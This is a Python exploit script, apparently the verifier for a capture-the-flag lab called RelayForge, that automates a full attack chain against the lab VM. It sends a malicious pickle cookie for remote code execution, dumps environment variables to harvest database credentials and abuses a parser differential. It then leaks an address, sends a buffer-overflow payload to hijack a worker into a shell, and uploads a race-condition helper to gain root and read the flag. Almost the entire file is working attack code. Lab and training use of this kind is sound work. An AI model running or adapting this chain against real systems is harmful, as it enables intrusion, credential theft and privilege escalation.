#!/usr/bin/env python3
"""Strict end-to-end verifier for RelayForge's intended attack chain."""

from __future__ import annotations

import argparse
import base64
import http.cookiejar
import json
import re
import secrets
import shlex
import socket
import ssl
import struct
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from pathlib import Path

from pickle_payload import payload, random_result_name


GUEST_USER = "guest"
GUEST_PASSWORD = "guest-relay-2026"
CRAFTED_OPTIONS = "profile=safe&note=quarterly&profile=legacy"
ROOT_FLAG_PATH = "/var/lib/relayforge/flag/root.txt"
UUID_RE = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")
FLAG_RE = re.compile(r"RF\{[0-9a-f]{32}\}")
WEB_ID_RE = re.compile(r"uid=65532(?:\([^)]*\))?")
RELAY_ID_RE = re.compile(r"uid=\d+\(relay\)")
ROOT_UID_PROOF_RE = re.compile(r"(?m)^ROOT_UID=0\r?$")
ROOT_FLAG_PROOF_RE = re.compile(r"(?m)^ROOT_FLAG=(RF\{[0-9a-f]{32}\})\r?$")
LEAK_RE = re.compile(r"worker_shell=(0x[0-9a-fA-F]+)\Z")
CSRF_RE = re.compile(rb'name="csrf_token" value="([A-Za-z0-9_-]+)"')


class ChainError(RuntimeError):
    pass


def _target_details(value: str) -> tuple[str, str]:
    candidate = value if "://" in value else f"https://{value}"
    parsed = urllib.parse.urlsplit(candidate)
    if parsed.scheme != "https" or not parsed.netloc or parsed.hostname is None:
        raise ChainError("target must be an HTTPS hostname or address")
    if parsed.path not in ("", "/") or parsed.query or parsed.fragment:
        raise ChainError("target must not contain a path, query, or fragment")
    return f"https://{parsed.netloc}", parsed.hostname


def _make_opener(verify_tls: bool) -> urllib.request.OpenerDirector:
    jar = http.cookiejar.CookieJar()
    context = ssl.create_default_context() if verify_tls else ssl._create_unverified_context()
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=context),
    )


def _open(opener: urllib.request.OpenerDirector, request: str | urllib.request.Request, timeout: float) -> tuple[bytes, str]:
    try:
        with opener.open(request, timeout=timeout) as response:
            return response.read(), response.geturl()
    except urllib.error.HTTPError as exc:
        raise ChainError(f"HTTP {exc.code} for {exc.url}") from exc
    except urllib.error.URLError as exc:
        raise ChainError(f"HTTP connection failed: {exc.reason}") from exc


def _post_form(opener: urllib.request.OpenerDirector, url: str, fields: dict[str, str], timeout: float) -> tuple[bytes, str]:
    request = urllib.request.Request(
        url,
        data=urllib.parse.urlencode(fields).encode("ascii"),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    return _open(opener, request, timeout)


def _get_json(opener: urllib.request.OpenerDirector, url: str, timeout: float) -> dict:
    raw, _ = _open(opener, url, timeout)
    try:
        value = json.loads(raw)
    except json.JSONDecodeError as exc:
        raise ChainError(f"non-JSON response from {url}") from exc
    if not isinstance(value, dict):
        raise ChainError(f"non-object JSON response from {url}")
    return value


def _remember_cookie_header(opener: urllib.request.OpenerDirector, state: str) -> str:
    jar = next(
        (
            handler.cookiejar
            for handler in opener.handlers
            if isinstance(handler, urllib.request.HTTPCookieProcessor)
        ),
        None,
    )
    if jar is None:
        raise ChainError("HTTP client has no cookie jar")
    cookies = [
        f"{cookie.name}={cookie.value}"
        for cookie in jar
        if cookie.name != "remember_prefs"
    ]
    if not any(item.startswith("session=") for item in cookies):
        raise ChainError("authenticated Flask session cookie is missing")
    cookies.append(f"remember_prefs={state}")
    return "; ".join(cookies)


def _run_pickle(opener: urllib.request.OpenerDirector, base: str, command: str, timeout: float) -> str:
    result_name = random_result_name()
    result_path = f"/tmp/relayforge-results/{result_name}"
    temporary_path = result_path + ".tmp"
    captured_command = (
        f"({command}) > {shlex.quote(temporary_path)} 2>&1; "
        f"mv -- {shlex.quote(temporary_path)} {shlex.quote(result_path)}"
    )
    request = urllib.request.Request(
        f"{base}/dashboard",
        headers={"Cookie": _remember_cookie_header(opener, payload(captured_command))},
    )
    _, final_url = _open(opener, request, timeout)
    if urllib.parse.urlsplit(final_url).path == "/login":
        raise ChainError("pickle request lost its authenticated session")

    result_url = f"{base}/api/result/{result_name}"
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            raw, _ = _open(opener, result_url, min(timeout, 3.0))
        except ChainError as exc:
            if "HTTP 404" not in str(exc):
                raise
            time.sleep(0.1)
            continue
        try:
            result = json.loads(raw)
        except json.JSONDecodeError as exc:
            raise ChainError("one-shot result endpoint returned non-JSON") from exc
        if not isinstance(result, dict) or result.get("name") != result_name or not isinstance(result.get("output"), str):
            raise ChainError("one-shot result endpoint returned an invalid object")
        return result["output"]
    raise ChainError("pickle command did not produce a one-shot result")


def _python_command(code: str) -> str:
    return "python3 -c " + shlex.quote(code)


def _poll_job(
    opener: urllib.request.OpenerDirector,
    base: str,
    request_id: str,
    http_timeout: float,
    provision_timeout: float,
) -> tuple[int, str]:
    deadline = time.monotonic() + provision_timeout
    last: dict = {}
    url = f"{base}/api/status/{urllib.parse.quote(request_id, safe='')}"
    while time.monotonic() < deadline:
        last = _get_json(opener, url, http_timeout)
        request_state = last.get("request_state")
        job_state = last.get("job_state")
        if request_state == "denied" or job_state in {"failed", "expired"}:
            raise ChainError(f"request stopped in request={request_state!r}, job={job_state!r}")
        if request_state == "approved" and job_state == "running":
            try:
                port = int(last["endpoint_port"])
            except (KeyError, TypeError, ValueError) as exc:
                raise ChainError("running job omitted a valid endpoint_port") from exc
            token = last.get("session_token")
            if not 1 <= port <= 65535 or not isinstance(token, str) or len(token) < 24:
                raise ChainError("running job returned an invalid port or session token")
            return port, token
        time.sleep(0.5)
    raise ChainError(
        "provisioning timed out "
        f"(request={last.get('request_state')!r}, job={last.get('job_state')!r})"
    )


def _recv_line(sock: socket.socket, timeout: float, limit: int = 4096) -> bytes:
    sock.settimeout(timeout)
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            break
        data.extend(chunk)
        if len(data) > limit:
            raise ChainError("Worker line exceeded size limit")
    if not data:
        raise ChainError("Worker closed without a response")
    return bytes(data)


def _banner_job(line: bytes) -> str:
    text = line.decode("utf-8", errors="replace")
    match = re.search(r"\bjob=([0-9a-f-]{36})\b", text)
    if match is None:
        raise ChainError(f"Worker banner omitted job UUID: {text.strip()!r}")
    try:
        return str(uuid.UUID(match.group(1)))
    except ValueError as exc:
        raise ChainError("Worker banner contained an invalid job UUID") from exc


def _wrong_token(token: str) -> str:
    replacement = "1" if token[0] != "1" else "0"
    return replacement + token[1:]


def _read_until(sock: socket.socket, terminator: bytes, timeout: float, limit: int = 1_048_576) -> bytes:
    deadline = time.monotonic() + timeout
    data = bytearray()
    while terminator not in data:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise ChainError("timed out waiting for shell command completion")
        sock.settimeout(min(1.0, remaining))
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            continue
        if not chunk:
            raise ChainError("relay shell closed unexpectedly")
        data.extend(chunk)
        if len(data) > limit:
            raise ChainError("relay shell output exceeded size limit")
    return bytes(data)


def _read_to_eof(sock: socket.socket, timeout: float, limit: int = 1_048_576) -> bytes:
    deadline = time.monotonic() + timeout
    data = bytearray()
    while True:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise ChainError("timed out waiting for tunneled response EOF")
        sock.settimeout(min(1.0, remaining))
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            continue
        if not chunk:
            return bytes(data)
        data.extend(chunk)
        if len(data) > limit:
            raise ChainError("tunneled response exceeded size limit")


def _shell_capture(sock: socket.socket, command: str, timeout: float) -> tuple[str, int]:
    marker = f"__RF_{secrets.token_hex(12)}"
    begin = f"{marker}_BEGIN"
    rc_marker = f"{marker}_RC="
    end = f"{marker}_END"
    script = (
        f"printf '{begin}\\n'\n"
        f"{command}\n"
        "rf_status=$?\n"
        f"printf '\\n{rc_marker}%s\\n{end}\\n' \"$rf_status\"\n"
    )
    sock.sendall(script.encode("utf-8"))
    raw = _read_until(sock, (end + "\n").encode("ascii"), timeout)
    text = raw.decode("utf-8", errors="replace")
    start = text.find(begin)
    finish = text.find(end, start + len(begin))
    if start < 0 or finish < 0:
        raise ChainError("relay shell command markers were missing")
    section = text[start + len(begin) : finish]
    rc_match = re.search(re.escape(rc_marker) + r"(\d+)", section)
    if rc_match is None:
        raise ChainError("relay shell command exit status was missing")
    output = section[: rc_match.start()]
    return output, int(rc_match.group(1))


def _connect_worker(host: str, port: int, timeout: float) -> socket.socket:
    try:
        return socket.create_connection((host, port), timeout=timeout)
    except OSError as exc:
        raise ChainError(f"could not connect to Worker {host}:{port}: {exc}") from exc


def run(args: argparse.Namespace) -> str:
    base, worker_host = _target_details(args.target)
    opener = _make_opener(args.verify_tls)

    login_page, _ = _open(opener, f"{base}/login", args.http_timeout)
    csrf_match = CSRF_RE.search(login_page)
    if csrf_match is None:
        raise ChainError("login page omitted its CSRF token")
    dashboard, final_url = _post_form(
        opener,
        f"{base}/login",
        {
            "username": GUEST_USER,
            "password": GUEST_PASSWORD,
            "csrf_token": csrf_match.group(1).decode("ascii"),
        },
        args.http_timeout,
    )
    if urllib.parse.urlsplit(final_url).path == "/login":
        raise ChainError("guest login was not accepted")
    active_csrf_match = CSRF_RE.search(dashboard)
    if active_csrf_match is None:
        raise ChainError("dashboard omitted its current CSRF token")
    active_csrf = active_csrf_match.group(1).decode("ascii")
    print("[+] login: guest authenticated")

    discovery = _run_pickle(
        opener,
        base,
        "printf '__RF_ID__\\n'; id; printf '__RF_ENV__\\n'; env | sort",
        args.http_timeout,
    )
    if WEB_ID_RE.search(discovery) is None:
        raise ChainError("pickle command did not execute as Web UID 65532")
    try:
        environment_text = discovery.split("__RF_ENV__\n", 1)[1]
    except IndexError as exc:
        raise ChainError("pickle environment marker was missing") from exc
    environment = {
        key: value
        for line in environment_text.splitlines()
        if "=" in line
        for key, value in [line.split("=", 1)]
    }
    required = ("DB_HOST", "DB_NAME", "DB_USER", "DB_PASSWORD")
    if any(not environment.get(key) for key in required) or environment["DB_USER"] != "relay_web":
        raise ChainError("pickle output omitted the restricted relay_web database credential")
    print("[+] pickle RCE: Web UID 65532; relay_web credential recovered")

    boundary_python = (
        "import os, psycopg2\n"
        "connection = psycopg2.connect(host=os.environ['DB_HOST'], dbname=os.environ['DB_NAME'], "
        "user=os.environ['DB_USER'], password=os.environ['DB_PASSWORD'], connect_timeout=3)\n"
        "cursor = connection.cursor()\n"
        "cursor.execute('SELECT current_user')\n"
        "print('CURRENT_USER=' + cursor.fetchone()[0])\n"
        "try:\n"
        "    cursor.execute('SELECT 1 FROM private.jobs LIMIT 1')\n"
        "    print('PRIVATE_JOBS=READABLE')\n"
        "except psycopg2.Error as exc:\n"
        "    print('PRIVATE_JOBS=DENIED:' + str(exc.pgcode))\n"
    )
    boundary = _run_pickle(opener, base, _python_command(boundary_python), args.http_timeout)
    if "CURRENT_USER=relay_web" not in boundary or "PRIVATE_JOBS=DENIED:42501" not in boundary:
        raise ChainError(f"database boundary assertion failed: {boundary.strip()!r}")
    print("[+] DB boundary: private.jobs denied to relay_web (SQLSTATE 42501)")

    submit_command = " ".join(
        shlex.quote(part)
        for part in (
            "python3",
            "-m",
            "app.raw_rpc",
            "--username",
            GUEST_USER,
            "--target",
            "archive-echo",
            "--service",
            "echo",
            "--duration",
            "420",
            "--options",
            CRAFTED_OPTIONS,
        )
    )
    submission = _run_pickle(opener, base, submit_command, args.http_timeout).strip()
    request_match = UUID_RE.search(submission)
    if request_match is None:
        raise ChainError(f"raw request submission did not return a UUID: {submission!r}")
    request_id = str(uuid.UUID(request_match.group(0)))
    print(f"[+] parser differential: raw request {request_id}")

    port, token = _poll_job(
        opener, base, request_id, args.http_timeout, args.provision_timeout
    )
    print(f"[+] signed job: running on port {port}")

    with _connect_worker(worker_host, port, args.socket_timeout) as rejected:
        rejected.sendall(f"TOKEN {_wrong_token(token)}\n".encode("ascii"))
        if _recv_line(rejected, args.socket_timeout) != b"ERR auth\n":
            raise ChainError("Worker did not reject an incorrect session token")

    with _connect_worker(worker_host, port, args.socket_timeout) as tunneled:
        tunneled.sendall(f"TOKEN {token}\n".encode("ascii"))
        tunnel_job = _banner_job(_recv_line(tunneled, args.socket_timeout))
        if _recv_line(tunneled, args.socket_timeout) != b"OK\n":
            raise ChainError("Worker rejected the valid tunnel token")
        tunneled.sendall(b"CONNECT\n")
        if _recv_line(tunneled, args.socket_timeout) != b"CONNECTED\n":
            raise ChainError("Worker did not establish the approved endpoint tunnel")
        tunneled.sendall(b"GET / HTTP/1.0\r\nConnection: close\r\n\r\n")
        http_response = _read_to_eof(tunneled, args.socket_timeout)
        if re.match(rb"HTTP/1\.[01] [1-5][0-9]{2}(?: |\r\n)", http_response) is None:
            raise ChainError(f"tunnel target did not return HTTP: {http_response[:160]!r}")
    print("[+] relay boundary: bidirectional tunnel reached the approved HTTP endpoint")

    client = _connect_worker(worker_host, port, args.socket_timeout)
    remote_script: str | None = None
    try:
        client.sendall(f"TOKEN {token}\n".encode("ascii"))
        job_id = _banner_job(_recv_line(client, args.socket_timeout))
        if job_id != tunnel_job:
            raise ChainError("Worker job UUID changed between token checks")
        if _recv_line(client, args.socket_timeout) != b"OK\n":
            raise ChainError("Worker rejected the valid session token")
        print(f"[+] token gate: wrong rejected; valid accepted for job {job_id}")

        client.sendall(b"LEAK\n")
        leak_line = _recv_line(client, args.socket_timeout).decode("ascii", errors="replace").strip()
        leak_match = LEAK_RE.fullmatch(leak_line)
        if leak_match is None:
            raise ChainError(f"Worker did not return the PIE leak: {leak_line!r}")
        address = int(leak_match.group(1), 16)
        exploit = b"A" * 128 + struct.pack("<Q", address)
        client.sendall(f"OVERFLOW {len(exploit)}\n".encode("ascii") + exploit)
        shell_banner = _recv_line(client, args.socket_timeout).decode("utf-8", errors="replace")
        if "relay shell opened" not in shell_banner:
            raise ChainError(f"callback overwrite did not open the relay shell: {shell_banner.strip()!r}")
        print(f"[+] Worker corruption: callback redirected via {leak_match.group(1)}")

        identity, identity_rc = _shell_capture(client, "id", args.socket_timeout)
        if identity_rc != 0 or RELAY_ID_RE.search(identity) is None:
            raise ChainError(f"shell did not run as relay: {identity.strip()!r}")
        print("[+] host shell: uid relay")

        direct_read, direct_rc = _shell_capture(
            client, f"cat {shlex.quote(ROOT_FLAG_PATH)} 2>&1", args.socket_timeout
        )
        if direct_rc == 0 or FLAG_RE.search(direct_read) is not None:
            raise ChainError("relay could read the root flag directly")
        print("[+] direct flag read: denied")

        local_race = Path(__file__).with_name("exploit_supervisor_race.py")
        encoded = base64.b64encode(local_race.read_bytes()).decode("ascii")
        remote_script = f"/tmp/rf-race-{secrets.token_hex(8)}.py"
        transfer_command = (
            "umask 077; printf %s "
            + shlex.quote(encoded)
            + " | base64 -d > "
            + shlex.quote(remote_script)
        )
        transfer_output, transfer_rc = _shell_capture(client, transfer_command, args.socket_timeout)
        if transfer_rc != 0:
            raise ChainError(f"race helper transfer failed: {transfer_output.strip()!r}")

        race_output, race_rc = _shell_capture(
            client,
            f"python3 {shlex.quote(remote_script)} {shlex.quote(job_id)}",
            args.race_timeout,
        )
        uid_match = ROOT_UID_PROOF_RE.search(race_output)
        flag_match = ROOT_FLAG_PROOF_RE.search(race_output)
        if race_rc != 0 or uid_match is None or flag_match is None:
            raise ChainError(
                "Supervisor diagnostic race did not prove uid=0 and return the exact flag "
                f"(rc={race_rc}): {race_output.strip()!r}"
            )
        flag = flag_match.group(1)
        if FLAG_RE.fullmatch(flag) is None:
            raise ChainError("Supervisor diagnostic returned a malformed root flag")
        print("[+] Supervisor diagnostic TOCTOU: uid=0 execution and root flag obtained")
        print(flag)
        return flag
    finally:
        if remote_script is not None:
            try:
                _shell_capture(client, f"rm -f -- {shlex.quote(remote_script)}", 3.0)
            except (ChainError, OSError):
                pass
        client.close()
        try:
            cancellation = urllib.request.Request(
                f"{base}/api/cancel",
                data=json.dumps({"id": request_id}, separators=(",", ":")).encode("ascii"),
                headers={"Content-Type": "application/json", "X-CSRF-Token": active_csrf},
            )
            _open(opener, cancellation, 3.0)
        except (ChainError, OSError):
            pass


def main() -> int:
    parser = argparse.ArgumentParser(description="Verify RelayForge's complete intended attack chain")
    parser.add_argument("target", help="lab VM hostname/address, optionally prefixed with https://")
    parser.add_argument("--verify-tls", action="store_true", help="verify the HTTPS certificate")
    parser.add_argument("--http-timeout", type=float, default=10.0)
    parser.add_argument("--socket-timeout", type=float, default=8.0)
    parser.add_argument("--provision-timeout", type=float, default=45.0)
    parser.add_argument("--race-timeout", type=float, default=20.0)
    args = parser.parse_args()
    if min(args.http_timeout, args.socket_timeout, args.provision_timeout, args.race_timeout) <= 0:
        parser.error("timeouts must be positive")

    try:
        run(args)
    except (ChainError, OSError, ValueError, struct.error) as exc:
        print(f"[-] full chain failed: {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
